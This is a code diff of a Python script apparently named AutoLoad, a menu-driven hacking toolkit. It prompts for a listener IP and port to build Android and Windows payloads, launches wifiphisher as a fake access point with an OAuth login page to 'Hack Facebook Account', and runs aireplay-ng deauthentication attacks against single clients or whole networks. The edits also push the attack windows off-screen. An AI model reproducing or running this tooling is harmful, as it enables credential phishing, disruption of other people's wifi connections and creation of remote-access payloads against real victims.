@@ -10,6 +10,8 @@ import requests
 import httplib
 import socket
 import loading
+managed=open('/usr/share/managed.txt').read()
+monitor=open('/usr/share/monitor.txt').read()
 os.system('resize -s 19 92')
 os.system('clear')
 print(Fore.GREEN +"                        Welcome to                   |::::::Follow Me on::::::")
@@ -43,10 +45,11 @@ def check_internet():
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
 def android():
     os.system('clear')
-    print("[*]::::::Create Payload For Android::::::")
+    print(Fore.GREEN +"[*]::::::Create Payload For Android::::::")
     print("")
     print("[*]Enter the IP and PORT you want to Listen on ")
-    ip=raw_input("[IP:] > ")
+    print("")
+    ip=raw_input(Fore.BLUE +"[IP:] > ")
     port=raw_input("[PORT:] > ")
     name=raw_input("[Name of the File:] > ")
     path=raw_input("File Save to[add '/' in the end]: ")
@@ -60,11 +63,11 @@ def android():
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
 def windows():
     os.system('clear')
-    print("[*]::::::Create Payload For Windows::::::")
+    print(Fore.GREEN +"[*]::::::Create Payload For Windows::::::")
     print("")
     print("[*]Enter the IP and PORT you want to Listen on ")
     print("")
-    ip=raw_input("[IP:] > ")
+    ip=raw_input(Fore.BLUE +"[IP:] > ")
     port=raw_input("[PORT:] > ")
     name=raw_input("[Name of the File:] > ")
     path=raw_input("File Save to[add '/' in the end]: ")
@@ -79,9 +82,9 @@ def windows():
 def helppp():
     os.system('clear')
     print("")
-    print("[..Example..]")
+    print(Fore.GREEN +"[..Example..]")
     print("")
-    print("IP: 192.168.43.1")
+    print(Fore.BLUE +"IP: 192.168.43.1")
     print("PORT: 4444")
     print("Name of the File: payload")
     print("File Save to[add '/' in the end]: /root/payload/")
@@ -92,57 +95,84 @@ def helppp():
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
 def fakeap():
     os.system('clear')
-    print("[*]::::::Create a Fake AP to Hack Facebook Account::::::")
+    print(Fore.GREEN +"[*]::::::Create a Fake AP to Hack Facebook Account::::::")
     print("")
-    ap=raw_input("[Enter the name of the AP:] > ")
+    ap=raw_input(Fore.BLUE +"[Enter the name of the AP:] > ")
     print("[]Creating............")
-    os.system('xterm -e wifiphisher  --essid' +ap+ '-p oauth-login; exec bash')
+    os.system('xterm -geometry 60x15+0+999999 -e wifiphisher  --essid ' +ap+ ' -p oauth-login')
     print("Done..")
     os.system('clear')
     import Autoload
 #-------------------------------------------------------------------------------------------------------------------------------------------------------------
 def deauth():
-    os.system('clear')
     def single():
-        apmac=raw_input("[Enter the AP Essid(MAC):] > ")
+        os.system('clear')
+        print("")
+        print(Fore.GREEN +"[*] Disconnect Single Client[Effective/Recommanded]")
+        print("")
+        print("[Just copy and paste the essid]")
+        print("")
+        apmac=raw_input(Fore.BLUE +"[Enter the AP Essid(MAC):] > ")
+        print("")
         cmac=raw_input("[Enter the Client's MAC:] > ")
-        wificard=raw_input("[Name of the WiFi card name in moniter mode:] > ")
-        os.system('xterm -e aireplay-ng --deauth -a' +apmac+ '-c' +cmac+ wificard)
+        print("")
+        packet=raw_input("[packets to send:] > ")
+        os.system('xterm -geometry 60x15+0+999999 -e aireplay-ng --deauth '+packet+ ' -a ' +apmac+ ' -c ' +cmac +' '+ monitor)
+        os.system('clear')
+        user_input()
     def allcl():
-        apmac=raw_input("[Enter the AP Essid(MAC):] > ")
-        wificard=raw_input("[Name of the WiFi card name in moniter mode:] > ")
-        os.system('xterm -e aireplay-ng --deauth -a' +apmac+ wificard)   
-    print("[*]:::::: Disconnect Client From there AP ::::::")
-    print("")
-    print("1.) Disconnect Single Client[Effective/Recommanded]")
-    print("2.) Disconnect All Client[Less Effective]")
-    print("3.) Scan ")
-    print("4.) Enable Moniter Mode")
-    print("5.) Disable Moniter Mode")
-    print("6.) Back")
-    print("")
-    user=input(Fore.BLUE +"[autoload:] > ")
-    if user == 1:
-        single()
-    elif user == 2:
-        allcl()
-    elif user == 3:
         os.system('clear')
-        os.system('gnome-terminal -e airodump-ng wlan0mon &')
-        deauth()
-    elif user == 4:
-        os.system('airmon-ng start wlan0')
-        print("Done..")
-        deauth()
-    elif user == 5:
-        os.system('airmon-ng stop wlan0mon')
-        print("Done..")
-        deauth()
-    elif user == 6:
+        print("")
+        print(Fore.GREEN +"[*] Disconnect All Client[Less Effective")
+        print("")
+        print("[Just copy and paste the essid]")
+        print("")
+        apmac=raw_input(Fore.BLUE +"[Enter the AP Essid(MAC):] > ")
+        print("")
+        packets=raw_input("[packets to send:] > ")
+        os.system('xterm -geometry 60x15+0+999999 -e aireplay-ng --deauth '+packets+ ' -a ' +apmac+' '+ monitor)
         os.system('clear')
-        import Autoload
-    else:
-       print("Wrong Choice")
+        user_input()
+    def user_input():
+        print(Fore.GREEN +"[*]:::::: Disconnect Client From there AP ::::::")
+        print("")
+        print(Fore.BLUE +"1.) Disconnect Single Client[Effective/Recommanded]")
+        print("2.) Disconnect All Client[Less Effective]")
+        print("3.) Scan ")
+        print("4.) Enable Moniter Mode")
+        print("5.) Disable Moniter Mode")
+        print("6.) Back")
+        print("7.) Exit")
+        print("")
+        while True:
+            userif=input(Fore.BLUE +"[autoload:] > ")
+            if userif == 1:
+                single()
+            elif userif == 2:
+                allcl()
+            elif userif == 3:
+                os.system('clear')
+                os.system('gnome-terminal --window  -- airodump-ng '+monitor)
+                deauth()
+            elif userif == 4:
+                os.system('airmon-ng start '+managed)
+                print("Done..")
+                deauth()
+            elif userif == 5:
+                os.system('airmon-ng stop '+monitor)
+                print("Done..")
+                deauth()
+            elif userif == 6:
+                os.system('clear')
+                import Autoload
+            elif userif == 7:
+                print("")
+                print("Thanks For Using AutoLoad")
+                sys.exit()
+            else:
+                print("Wrong Choice")
+    os.system('clear')
+    user_input()
 #------------------------------------------------------------------------------------------------------------------------------------------------------------ 
 def check_ip():
     os.system('clear')
@@ -211,7 +241,7 @@ while True:
             os.system('clear')
             print("[*]::::::GeoLocate An IP Address::::::")
             print("")
-            os.system('bash geoip.sh')
+            os.system('bash /usr/share/geoip.sh')
             import Autoload
         elif user == 6:
             check_ip()
